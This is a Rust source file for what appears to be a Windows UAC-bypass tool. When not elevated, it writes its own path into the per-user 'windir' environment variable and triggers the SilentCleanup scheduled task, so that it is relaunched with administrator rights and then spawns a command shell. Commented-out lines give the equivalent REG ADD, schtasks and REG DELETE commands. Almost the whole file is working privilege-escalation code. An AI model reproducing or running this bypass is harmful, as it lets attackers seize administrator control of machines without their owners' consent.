use std::process::Command;

pub mod is_elevated;
pub mod registry;
pub mod schtasks;

fn main() {
  // Check the elevation
  if !is_elevated::is_elevated() {
    elevate();
  } else {
    Command::new("cmd.exe").spawn().unwrap();
  }
}

fn elevate() {
  println!("[+] Elevating...");
  // Add
  // Command::new("cmd")
  //   .args(&[
  //     "/C",
  //     &*format!(
  //       "REG ADD HKCU\\Environment /v windir /d \"{}\"",
  //       std::env::current_exe().unwrap().to_str().unwrap()
  //     ),
  //     "/f",
  //   ])
  //   .output()
  //   .unwrap();
  registry::set_windir();

  // Run
  // Command::new("schtasks.exe")
  //   .args(&[
  //     "/Run",
  //     "/TN",
  //     r"\Microsoft\Windows\DiskCleanup\SilentCleanup",
  //     "/I",
  //   ])
  //   .output()
  //   .unwrap();
  schtasks::run_silent_cleanup_task();

  // Delete
  // Command::new("cmd")
  //   .args(&[
  //     "/C",
  //     "REG",
  //     "DELETE",
  //     r"HKCU\Environment",
  //     "/v",
  //     "windir",
  //     "/f",
  //   ])
  //   .output()
  //   .unwrap();
  registry::delete_windir();
}
